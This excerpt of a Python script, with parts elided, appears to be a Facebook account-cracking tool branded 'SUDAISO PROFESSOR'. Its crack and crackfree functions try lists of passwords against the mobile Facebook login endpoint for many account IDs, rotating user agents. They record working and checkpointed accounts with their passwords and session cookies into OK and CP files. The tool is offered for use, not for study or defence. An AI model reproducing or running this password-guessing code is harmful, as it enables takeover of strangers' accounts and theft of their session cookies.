...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m×\033[97;1m] \033[0;92mSEND ME FRIEND REQUEST")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/Mr.sudaisOo?mibextid=ZbWKwL/')
#------------------[ SUDAISO ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
os.system("xdg-open https://www.facebook.com/Mr.sudaisOo?mibextid=ZbWKwL")
#------------------[ LOGO-LAKNAT ]-----------------#
logo ="""\033
\033[0;92m███████╗██████╗ 
\033[0;92m██╔════╝██╔══██╗
...
\033[1;35m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;35m 
     \033[1;31m✓\033[1;31m [🤍] \033[1;31mCREATOR - \033[1;31mSUDAISO PROFESSOR\033[1;31m
     \033[92;1m✓\033[92;1m [🤍] \033[92;1mNUMBER  - \033[92;1mNOT AVAILABLE\033[92;1m
     \033[1;37m✓\033[1;37m [🤍] \033[1;34mVERSION - \033[1;36m0.1\033[1;36m
\033[1;35m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;35m"""
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,  Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  SUDAIS,  PROFESSOR,  Tools"')
pass
...
def menu():
    ...
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mRANDOM COMMING SOON""")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[SUDAISOO•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[SUDAIS-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[SUDAIS-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " SUDAISOO,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SUDAISOO-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•SUDAIS-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•SUDAISOO-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  SUDAISOO,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
